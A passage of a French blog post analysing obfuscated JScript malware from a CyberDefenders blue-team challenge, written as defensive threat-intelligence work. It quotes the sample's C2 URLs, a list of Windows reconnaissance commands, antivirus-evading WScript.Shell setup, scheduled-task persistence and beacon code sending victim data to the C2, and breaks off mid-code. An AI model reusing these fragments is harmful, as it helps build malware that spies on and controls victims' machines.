

<!DOCTYPE html>
<html
  lang="fr-fr"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="false"
><head>
  <meta charset="utf-8" />
  
    <meta http-equiv="content-language" content="fr-fr" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>JScript et threat intelligence : analyse d&#39;un code malveillant &middot; nathan.out</title>
    <meta name="title" content="JScript et threat intelligence : analyse d&#39;un code malveillant &middot; nathan.out" />
  
  
  
  
  
  <link rel="canonical" href="https://nathan-out.github.io/posts/jscript-et-threat-intelligence/" />
  
  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.3be096bcd7d4e68dd376b85e8c0157153f5ad62d1d8da3aa541971bdc763082a2357c4f56750b40c029adc50e54e156d1535c7d6a4cfe2f9fe7b128da3507509.css"
    integrity="sha512-O&#43;CWvNfU5o3TdrhejAFXFT9a1i0djaOqVBlxvcdjCCojV8T1Z1C0DAKa3FDlThVtFTXH1qTP4vn&#43;exKNo1B1CQ=="
  />
  
  
  <script type="text/javascript" src="/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js" integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1&#43;ko&#43;UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
  
    
    
    
  
  
    
    
  
  
  
    
    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.15ae6e2c9b1ac24a9ccf40003fa689efb1a18db1ee9b73d780b01a6c31b150441415862513e93184f68fe385759e4698b8763cba6a0f79493c1fed99ad5868d4.js" integrity="sha512-Fa5uLJsawkqcz0AAP6aJ77GhjbHum3PXgLAabDGxUEQUFYYlE&#43;kxhPaP44V1nkaYuHY8umoPeUk8H&#43;2ZrVho1A==" data-copy="Copier" data-copied="Copié"></script>
  
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="JScript et threat intelligence : analyse d&#39;un code malveillant" />
<meta property="og:description" content="Il y a quelques temps, j&rsquo;ai résolu le challenge Obfuscated de Cyberdefenders." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nathan-out.github.io/posts/jscript-et-threat-intelligence/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-10T22:08:20+02:00" />
<meta property="article:modified_time" content="2023-10-10T22:08:20+02:00" /><meta property="og:site_name" content="nathan.out" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="JScript et threat intelligence : analyse d&#39;un code malveillant"/>
<meta name="twitter:description" content="Il y a quelques temps, j&rsquo;ai résolu le challenge Obfuscated de Cyberdefenders."/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Mes articles",
    "name": "JScript et threat intelligence : analyse d\u0027un code malveillant",
    "headline": "JScript et threat intelligence : analyse d\u0027un code malveillant",
    
    "abstract": "Il y a quelques temps, j\u0026rsquo;ai résolu le challenge Obfuscated de Cyberdefenders.",
    "inLanguage": "fr-fr",
    "url" : "https:\/\/nathan-out.github.io\/posts\/jscript-et-threat-intelligence\/",
    "author" : {
      "@type": "Person",
      "name": "nathan.out"
    },
    "copyrightYear": "2023",
    "dateCreated": "2023-10-10T22:08:20\u002b02:00",
    "datePublished": "2023-10-10T22:08:20\u002b02:00",
    
    "dateModified": "2023-10-10T22:08:20\u002b02:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "1815"
  }]
  </script>


  
  <meta name="author" content="nathan.out" />
  
    
      <link href="https://github.com/nathan-out" rel="me" />
    
  
  
  






  
  
  


  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
        href="#main-content"
        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
          >&darr;</span
        >Aller au contenu</a
      >
    </div>
    
    
      <header class="py-6 font-semibold sm:py-10 text-neutral-900 dark:text-neutral print:hidden">
  <nav class="flex justify-between">
    
    <div>
      
        <a
          class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
          rel="me"
          href="/"
          >nathan.out</a
        >
      

    </div>
    
    
      <ul class="flex flex-col list-none ltr:text-right rtl:text-left sm:flex-row">
        
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/posts/"
                title="Mes articles"
                >Articles</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/a-propos/"
                title="A Propos"
                >A propos</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/write-up/"
                title="Write-up"
                >Write-up</a
              >
            </li>
          
        
        
          <li class="ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
            <button
              id="search-button"
              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
              title="Rechercher (/)"
            >
              

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
          </li>
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >Blog</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Mes articles</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/jscript-et-threat-intelligence/"
      >JScript et threat intelligence : analyse d&#39;un code malveillant</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        JScript et threat intelligence : analyse d'un code malveillant
      </h1>
      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2023-10-10 22:08:20 &#43;0200 CEST">10 octobre 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Temps de lecture">9 mins</span>
    

    
    
  </div>

  
  


      </div>
    </header>
    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
      
        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
  >
    Sommaire
  </summary>
  <div
    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
  >
    <nav id="TableOfContents">
  <ul>
    <li><a href="#rappel-du-challenge">Rappel du challenge</a></li>
    <li><a href="#au-pays-du-jscript">Au pays du JScript</a>
      <ul>
        <li><a href="#initialisation">Initialisation</a></li>
        <li><a href="#premier-niveau-de-persistance--copie-du-script">Premier niveau de persistance : copie du script</a></li>
        <li><a href="#second-niveau-de-persistance--tâche-planifiée">Second niveau de persistance : tâche planifiée</a></li>
        <li><a href="#reconnaissance">Reconnaissance</a></li>
        <li><a href="#communication-avec-les-c2">Communication avec les C2</a></li>
      </ul>
    </li>
    <li><a href="#analyse-de-la-menace">Analyse de la menace</a></li>
  </ul>
</nav>
  </div>
</details>

          </div>
        </div>
      
      <div class="min-w-0 min-h-0 max-w-prose">
        <p>Il y a quelques temps, j&rsquo;ai résolu le challenge <a href="https://cyberdefenders.org/blueteam-ctf-challenges/76#nav-questions">Obfuscated</a> de Cyberdefenders. Cependant, le challenge s&rsquo;arrête juste avant l&rsquo;analyse du code qui intéragit avec le C2. J&rsquo;ai donc décidé de poursuivre l&rsquo;analyse afin de comprendre en détail son fonctionnement et pourquoi pas faire un peu de Threat Intelligence&hellip;</p>
<p>Il sera question de mettre en contexte l&rsquo;analyse en rappellant les éléments essentiels du challenge, décortiquer le code malveillant afin de comprendre ses actions pour enfin analyser la menace dans le but de dégager une tendance.</p>
<h2 id="rappel-du-challenge" class="relative group">Rappel du challenge <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#rappel-du-challenge" aria-label="Ancre">#</a></span></h2>
<p>En résumé, nous sommes un analyste spécialisé qui a reçu une alerte à propos d&rsquo;un poste utilisateur au comportement étrange. On nous livre un document Word qui semble être la source de cette alerte.</p>
<p>Le document contient des macros, c&rsquo;est-à-dire du script embarqué qui est utilisé pour automatiser un certains nombre de tâches. Cependant, les pirates utilisent cette fonctionnalité pour infecter des postes. Afin d&rsquo;être plus discret et complexifier le travail des analystes, le code est  obfusqué et l&rsquo;infection est en plusieurs étapes. Le code est du <code>JScript</code> qui est un fichier de scripting Microsoft qui permet de lancer des commandes, c&rsquo;est plutôt proche du <code>Javascript</code> avec quelques ajouts en plus, comme la possibilité d&rsquo;intéragir avec le système hôte.</p>
<p>Le code malveillant contient de la donnée codée en base64 et une implémentation d&rsquo;un chiffrement type RC4 qui permet de déchiffrer la donnée obtenue après le décodage du base64. Une fois ceci fait, le challenge est terminé, et pourtant il nous reste le code le plus intéressant à explorer.</p>
<h2 id="au-pays-du-jscript" class="relative group">Au pays du JScript <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#au-pays-du-jscript" aria-label="Ancre">#</a></span></h2>
<h3 id="initialisation" class="relative group">Initialisation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initialisation" aria-label="Ancre">#</a></span></h3>
<p>Le code est toujours obfusqué, mais il me semble qu&rsquo;il l&rsquo;est moins que lors de l&rsquo;étape précédente ; quelques variables ont un nom &ldquo;en clair&rdquo; :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">count</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">count</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">ayuh</span>; <span style="color:#a6e22e">count</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (Math.<span style="color:#a6e22e">ceil</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">+</span> Math.<span style="color:#a6e22e">ceil</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>[...]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">eV_C</span>(<span style="color:#e6db74">&#34;TaskManager&#34;</span>, <span style="color:#e6db74">&#34;Windows Task Manager&#34;</span>, <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">v_FileName</span>, <span style="color:#e6db74">&#34;EzZETcSXyKAdF_e5I2i1&#34;</span>, <span style="color:#a6e22e">wyKN</span>, <span style="color:#66d9ef">false</span>);
</span></span></code></pre></div><p>La première étape initialise certaines variables pour la suite du script :</p>
<ul>
<li>
<p>stockage des deux URLs des C2 dans une variable, les URLs ne sont pas obfusquées.</p>
</li>
<li>
<p>stockage des commandes de reconnaissance du système dans une variable, non obfusquées.</p>
</li>
<li>
<p>initialisation d&rsquo;une variable qui contient le nom du script, elle sera utilisée plus tard.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">CKpR</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#e6db74">&#34;http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php&#34;</span>, <span style="color:#e6db74">&#34;http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tpO8</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;w3LxnRSbJcqf8HrU&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">recon_commands</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#e6db74">&#34;systeminfo &gt; &#34;</span>, <span style="color:#e6db74">&#34;net view &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;net view /domain &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;tasklist /v &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;gpresult /z &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;netstat -nao &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;ipconfig /all &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;arp -a &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;net share &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;net use &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;net user &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;net user administrator &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;net user /domain &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;net user administrator /domain &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;set  &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;dir %systemdrive%\x5cUsers\x5c*.* &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;dir %userprofile%\x5cAppData\x5cRoaming\x5cMicrosoft\x5cWindows\x5cRecent\x5c*.* &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;dir %userprofile%\x5cDesktop\x5c*.* &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;tasklist /fi \x22modules eq wow64.dll\x22  &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;tasklist /fi \x22modules ne wow64.dll\x22 &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;dir \x22%programfiles(x86)%\x22 &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;dir \x22%programfiles%\x22 &gt;&gt; &#34;</span>, <span style="color:#e6db74">&#34;dir %appdata% &gt;&gt;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">QUjy</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script_name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>;
</span></span></code></pre></div><p>Le programme va initialiser la classe WScriptShell qui permettra par la suite d&rsquo;exécuter les commandes ci-dessus. Cette initialisation est obfusquée en deux étapes, sans doute pour ne pas déclencher l&rsquo;antivirus.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_WScriptShell</span>() {<span style="color:#75715e">// ActiveXObject(WScript.Shell())
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">spq3</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;\u0041\u0063\u0074i\u0076eX\u004F\u0062j\u0065c\u0074&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ActiveXObject
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">zBVv</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">spq3</span>(<span style="color:#e6db74">&#39;\u0057\u0053cr\u0069\u0070\u0074\u002E\u0053he\u006C\u006C&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// WScript.Shell
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">zBVv</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="premier-niveau-de-persistance--copie-du-script" class="relative group">Premier niveau de persistance : copie du script <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#premier-niveau-de-persistance--copie-du-script" aria-label="Ancre">#</a></span></h3>
<p>Le code se localise dans le système de la victime puis va chercher à se copier dans <code>c:\Users\&lt;username&gt;\AppData\Local\Microsoft\Windows\</code> ou <code>c:\Users\&lt;username&gt;\AppData\Local\Temp\</code> ou <code>c:\Documents and Settings\&lt;username&gt;\Application Data\Microsoft\Windows\</code>, selon si les chemins existent sur le système.</p>
<p>Le malware va également essayer de se maintenir dans le système en se copiant dans le premier répertoire existant, avant de se mettre en dormance pendant un temps variable entre 5 et 10 minutes.</p>
<h3 id="second-niveau-de-persistance--tâche-planifiée" class="relative group">Second niveau de persistance : tâche planifiée <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#second-niveau-de-persistance--t%c3%a2che-planifi%c3%a9e" aria-label="Ancre">#</a></span></h3>
<p>Après la dormance, le script va se créer une tâche planifiée dont voici les caractéristiques :</p>
<ul>
<li>
<p>la tâche est créée sous l&rsquo;identifiant de l&rsquo;utilisateur courant.</p>
</li>
<li>
<p>la description de la tâche est générique : <code>Windows Task Manager</code>.</p>
</li>
<li>
<p>la tâche est immédiatement activée et démarerra dès que possible.</p>
</li>
<li>
<p>la tâche n&rsquo;est pas masquée à l&rsquo;utilisateur.</p>
</li>
<li>
<p>la date de début et de fin du déclencheur de la tâche sont <code>2015-07-12T11:47:24</code> et <code>2020-03-21T08:00:00</code> (non obfusquées).</p>
</li>
<li>
<p>la tâche s&rsquo;exécute quand l&rsquo;utilisateur est connecté au système.</p>
</li>
<li>
<p>l&rsquo;action de la tâche est d&rsquo;exécuter le programme envoyé par le C2.</p>
</li>
<li>
<p>l&rsquo;argument envoyé au programme est <code>EzZETcSXyKAdF_e5I2i1</code>, qui était une clef de déchiffrement de la première étape d&rsquo;infection.</p>
</li>
<li>
<p>le payload final s&rsquo;exécutera dans le premier emplacement disponible (voir le premier niveau de persistance).</p>
</li>
</ul>
<h3 id="reconnaissance" class="relative group">Reconnaissance <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reconnaissance" aria-label="Ancre">#</a></span></h3>
<p>Avant de recevoir les indications du C2, le programme effectue de la reconnaissance avec <code>cmd.exe</code>. Il cherche à obtenir des informations sur la machine de la victime mais également sur les connexions réseaux et les tâches planifiées.</p>
<p>Le programme créé également un fichier <code>~dat.tmp</code> à l&rsquo;endroit où il aura réussi à se copier pour contenir les informations de la reconnaissance.</p>
<pre tabindex="0"><code>systeminfo &gt;
net view &gt;&gt;
net view /domain &gt;&gt;
tasklist /v &gt;&gt;
gpresult /z &gt;&gt;
netstat -nao &gt;&gt;
ipconfig /all &gt;&gt;
arp -a &gt;&gt;
net share &gt;&gt;
net use &gt;&gt;
net user &gt;&gt;
net user administrator &gt;&gt;
net user /domain &gt;&gt;
net user administrator /domain &gt;&gt;
set  &gt;&gt;
dir %systemdrive%\x5cUsers\x5c*.* &gt;&gt;
dir %userprofile%\x5cAppData\x5cRoaming\x5cMicrosoft\x5cWindows\x5cRecent\x5c*.* &gt;&gt;
dir %userprofile%\x5cDesktop\x5c*.* &gt;&gt;
tasklist /fi \x22modules eq wow64.dll\x22  &gt;&gt; 
tasklist /fi \x22modules ne wow64.dll\x22 &gt;&gt;
dir \x22%programfiles(x86)%\x22 &gt;&gt;
dir \x22%programfiles%\x22 &gt;&gt; 
dir %appdata% &gt;&gt;
</code></pre><p>Voici un exemple de ce que produisent ces commandes :</p>
<pre tabindex="0"><code>Nom de l&#39;h“te:                              WINOUT
Nom du systŠme d&#39;exploitation:              Microsoft Windows 11 Professionnel
Version du systŠme:                         10.0.22621 N/A build 22621
Fabricant du systŠme d&#39;exploitation:        Microsoft Corporation
Configuration du systŠme d&#39;exploitation:    Station de travail autonome
Type de build du systŠme d&#39;exploitation:    Multiprocessor Free
Propri‚taire enregistr‚:                    &lt;username&gt;@outlook.fr
Organisation enregistr‚e:                   
Identificateur de produit:                  00330-52085-32356-AAOEM
Date d&#39;installation originale:              09/05/2023, 17:06:41
Heure de d‚marrage du systŠme:              04/10/2023, 20:08:47
Fabricant du systŠme:                       Dell Inc.
ModŠle du systŠme:                          Latitude 5590
Type du systŠme:                            x64-based PC
Processeur(s):                              1 processeur(s) install‚(s).
                                            [01]ÿ: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1600 MHz
Version du BIOS:                            Dell Inc. 1.17.0, 02/06/2021
R‚pertoire Windows:                         C:\Windows
R‚pertoire systŠme:                         C:\Windows\system32
P‚riph‚rique d&#39;amor‡age:                    \Device\HarddiskVolume4
Option r‚gionale du systŠme:                fr;Fran‡ais (France)
ParamŠtres r‚gionaux d&#39;entr‚e:              fr;Fran‡ais (France)
Fuseau horaire:                             (UTC+01:00) Bruxelles, Copenhague, Madrid, Paris
M‚moire physique totale:                    16ÿ242 Mo
M‚moire physique disponible:                9ÿ771 Mo
M‚moire virtuelleÿ: taille maximale:        17ÿ266 Mo
M‚moire virtuelleÿ: disponible:             10ÿ146 Mo
M‚moire virtuelleÿ: en cours d&#39;utilisation: 7ÿ120 Mo
Emplacements des fichiers d&#39;‚change:        C:\pagefile.sys
Domaine:                                    WORKGROUP
Serveur d&#39;ouverture de session:             \\WINOUT
Correctif(s):                               5 Corrections install‚es.
                                            [01]: KB5029921
                                            [02]: KB5012170
                                            [03]: KB5026039
                                            [04]: KB5030219
                                            [05]: KB5028756
Carte(s) r‚seau:                            4 carte(s) r‚seau install‚e(s).
                                            [01]: Intel(R) Ethernet Connection (4) I219-LM
                                                  Nom de la connexionÿ: Ethernet
                                                  tatÿ:                Support d‚connect‚
                                            [02]: Intel(R) Dual Band Wireless-AC 8265
                                                  Nom de la connexionÿ: Wi-Fi
                                                  DHCP activ‚ÿ:         Oui
                                                  Serveur DHCPÿ:        10.0.0.1
                                                  Adresse(s) IP
                                                  [01]: 10.0.0.53
                                                  [02]: fe80::e3e8:bd35:b540:b965
                                            [03]: Bluetooth Device (Personal Area Network)
                                                  Nom de la connexionÿ: Connexion r‚seau Bluetooth
                                                  tatÿ:                Support d‚connect‚
                                            [04]: VirtualBox Host-Only Ethernet Adapter
                                                  Nom de la connexionÿ: Ethernet 2
                                                  DHCP activ‚ÿ:         Non
                                                  Adresse(s) IP
                                                  [01]: &lt;IP&gt;
                                                  [02]: &lt;address&gt;
Configuration requise pour Hyper-V:         Extensions de mode du moniteur d&#39;ordinateur virtuelÿ: Oui
                                            Virtualisation activ‚e dans le microprogrammeÿ: Oui
                                            Traduction d&#39;adresse de second niveauÿ: Oui
                                            Pr‚vention de l&#39;ex‚cution des donn‚es disponibleÿ: Oui
</code></pre><h3 id="communication-avec-les-c2" class="relative group">Communication avec les C2 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#communication-avec-les-c2" aria-label="Ancre">#</a></span></h3>
<p>La fonction centrale de se programme se trouve ici. Une boucle infinie var garder le programme vivant afin de permettre aux attaquants d&rsquo;envoyer des commandes au programme.</p>
<p>Tout d&rsquo;abord, le programme va envoyer au C2 les informations de la victime via une requête HTTP, avec un user-agent unique qui dépend de la machine infectée :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">Kpxo</span>.<span style="color:#a6e22e">SETREQUESTHEADER</span>(<span style="color:#e6db74">&#34;user-agent:&#34;</span>, <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 6.1; Win64; x64); &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">get_victim_id</span>());
</span></span></code></pre></div><p>Les informations semblent chiffrées via un algorithme maison. Ensuite, un switch/case indique les différentes commandes que le programme peut recevoir du C2 avant de se mettre en dormance pour une durée d&rsquo;environ une heure :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">f3cb</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;good&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;exit&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;work&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">work</span>(<span style="color:#a6e22e">Ysyo</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
